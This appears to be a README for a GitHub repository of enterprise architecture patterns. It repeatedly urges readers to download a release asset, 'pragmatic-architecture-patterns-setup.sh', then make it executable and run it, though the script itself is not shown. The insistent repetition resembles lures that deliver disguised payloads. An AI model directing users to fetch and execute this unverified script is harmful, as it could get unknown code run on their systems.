[![Releases](https://img.shields.io/badge/Releases-v1.0-blue?logo=github)](https://github.com/alfonsoperugini/pragmatic-architecture-patterns/releases)

# Pragmatic Architecture Patterns for Scalable Enterprise Systems

![Architecture diagram](https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Cloud-system-architecture.png/1200px-Cloud-system-architecture.png)

Pragmatic guides for evolving enterprise architectures from MVP to scale. The repo covers observability, security, messaging, and system design patterns. It focuses on real-world adoption strategies and practical steps teams can use immediately.

Topics: ai-assisted-development · ai-collaboration · architecture-patterns · best-practices · evolutionary-architecture · microservices · observability · opentelemetry · software-architecture · system-design

---

[Download and run the release asset from Releases](https://github.com/alfonsoperugini/pragmatic-architecture-patterns/releases)  
You will find compiled artifacts and tools on the Releases page. Download the release asset pragmatic-architecture-patterns-setup.sh and execute it to install helpers and sample artifacts.

Quick links
- Releases: [https://github.com/alfonsoperugini/pragmatic-architecture-patterns/releases](https://github.com/alfonsoperugini/pragmatic-architecture-patterns/releases) (download and execute the release asset pragmatic-architecture-patterns-setup.sh)
- Badge:  
  [![Releases](https://img.shields.io/badge/Release-Download-blue?logo=github)](https://github.com/alfonsoperugini/pragmatic-architecture-patterns/releases)

Why this repo exists
- Provide clear patterns that map to real engineering problems.
- Bridge MVP practices and long-term scale decisions.
- Give operators and developers shared language and artifacts.
- Show how to add tracing, metrics, and logs with OpenTelemetry.
- Present security controls that match modern cloud constraints.
- Outline messaging and integration approaches that reduce coupling.

Core areas and what you will find
- Observability
  - Tracing patterns: distributed context, sampling, span design.
  - Metrics strategy: cardinality control, aggregated vs. raw metrics.
  - Logs: structured logs, correlation IDs, pipeline decisions.
  - OpenTelemetry examples: SDK setup, exporter configs, collector pipelines.
  - Dashboards and SLO-driven alerts.

- Security
  - Identity patterns: short-lived credentials, OIDC, mTLS.
  - Authorization: RBAC, ABAC, policy-as-code examples.
  - Secrets management: rotation, vault patterns, least privilege.
  - Supply chain: signing artifacts, reproducible builds.

- Messaging
  - Event-driven design: event schemas, idempotency, deduplication.
  - Messaging topologies: point-to-point, pub/sub, streaming.
  - Consumer patterns: backpressure, batching, visibility timeouts.
  - Integration: async vs sync trade-offs, faulthandling, dead-letter strategies.

- System design & architecture
  - Evolutionary architecture: small safe steps, toggles, incremental migration.
  - Bounded contexts: decomposing monoliths, anti-corruption layers.
  - Data ownership: single source of truth, event sourcing patterns.
  - Stateful services: sharding, state transfer, consistency models.

How to use this repo
- Read the pattern docs for the area you care about.
- Try the example artifacts in /examples.
- Use the checklist in each pattern to evaluate your design.
- Run the release helper to install local tools and sample data:
  1. Download pragmatic-architecture-patterns-setup.sh from the Releases page: https://github.com/alfonsoperugini/pragmatic-architecture-patterns/releases
  2. Make it executable: chmod +x pragmatic-architecture-patterns-setup.sh
  3. Run it: ./pragmatic-architecture-patterns-setup.sh
  The script installs helpers, loads sample configs, and starts a local demo stack.

Getting started (fast path)
1. Clone the repo:
   git clone https://github.com/alfonsoperugini/pragmatic-architecture-patterns.git
2. Open docs/overview.md and pick a pattern category.
3. Launch the demo stack in /examples/docker-compose or use the release helper from Releases.
4. Follow the step-by-step guides in docs/<pattern>/README.md to add tracing, metrics, and logs.
5. Apply the checklists and record decisions in architecture/decisions.md.

Example projects and patterns (selected)
- observability/basic-tracing
  - Language samples: Java, Go, Python
  - Collector config for OTLP -> Prometheus + Jaeger
  - Example traces and span naming rules

- messaging/event-driven-ordering
  - Event schema versioning example
  - Consumer retry and dead-letter handling
  - Benchmark notes for throughput and latency trade-offs

- security/zero-trust
  - mTLS bootstrap example with short-lived certs
  - OIDC integration for services and UIs
  - Policy-as-code example with OPA and Rego

- migration/strangler
  - Strangler fig pattern applied to a monolith
  - Feature toggle flows and traffic shifting
  - Data sync patterns during migration

Operational playbooks
- Incident response: runbook template, tracer-driven triage, metric thresholds.
- Deployment: canary rollout checklist, metric-based promotion.
- Scaling: autoscaling configs, backpressure measures, cost guardrails.

Decision records and templates
- Keep ADRs in /architecture/decisions.md.
- Use the provided ADR template for consistent rationale and trade-offs.
- Capture experiments and their impact in /experiments.

Design principles (short)
- Favor small, reversible steps.
- Make system behavior observable.
- Minimize blast radius.
- Prefer simple, explicit contracts.
- Treat security as code.

Examples and demos
- Local demo: docker-compose with a sample API, worker, tracing collector, and UI.
- Cloud demo: Terraform modules that create a minimal observability stack.
- CI examples: pipeline steps for tests, build signing, and automated canary analysis.

Integrating OpenTelemetry
- Use SDKs for automatic instrumentation where available.
- Propagate context across process and messaging boundaries.
- Configure the collector to route telemetry to multiple backends.
- Use metric and span labels with care; control cardinality.

Checklist: moving from MVP to scale
- Define ownership for each service and API.
- Add automated telemetry for each critical path.
- Add security gates in the pipeline for secrets and artifact signing.
- Add contract tests for public interfaces.
- Decide a breaking-change policy and document versioning norms.

Contributing
- Read CONTRIBUTING.md for the process.
- Add a pattern: create docs/<category>/<pattern>.md and an example under /examples.
- Open Pull Requests with a short ADR describing the change.
- Use the issue templates for bug reports, feature requests, or pattern proposals.

Repository layout (high level)
- /docs - pattern guides and checklists
- /examples - runnable examples and demo stacks
- /architecture - ADRs, diagrams, decision templates
- /tools - helper scripts and CI snippets
- /images - diagrams and reference graphics

Images and icons used
- OpenTelemetry logo and docs guide visuals.
- Public domain architecture diagrams and cloud icons.
- Screenshots of example traces and dashboards.

Search engine optimization and discovery
- Use descriptive headers and clear pattern names.
- Keep docs short and focused per pattern.
- Add tags and keywords in front matter for each doc.
- Provide sample commands and expected outputs for each example.

Release and install notes
- Check Releases at: https://github.com/alfonsoperugini/pragmatic-architecture-patterns/releases
- Download the asset pragmatic-architecture-patterns-setup.sh from the release you want.
- Make it executable and run it to set up local demos and helper tools.
- The script will:
  - Install a sample OpenTelemetry collector.
  - Launch example services.
  - Seed sample data for dashboards.
  - Provide a CLI wrapper to run common checks.

Security and licensing
- See SECURITY.md for reporting security issues.
- See LICENSE for license terms.

Useful commands (examples)
- Start local demo:
  ./pragmatic-architecture-patterns-setup.sh demo
- Run unit checks:
  ./tools/checks.sh
- Generate ADR:
  ./tools/new-adr.sh "Title of decision"

References and further reading
- OpenTelemetry docs: https://opentelemetry.io
- Patterns of Enterprise Application Architecture
- Event-Driven Microservices literature
- Best practices for observability and security in cloud-native systems

Contact and maintainers
- Maintainer: Alfonso Perugini (see GitHub profile)
- File issues and PRs on the repo
- Use discussions for design debates

Badges and metadata
[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/alfonsoperugini/pragmatic-architecture-patterns/releases)  [![OpenTelemetry](https://img.shields.io/badge/OpenTelemetry-Docs-lightgrey?logo=opentelemetry)](https://opentelemetry.io)

Get the release asset and try the demos:
https://github.com/alfonsoperugini/pragmatic-architecture-patterns/releases

Contribute patterns, open issues, and help shape the migration guides and operational playbooks.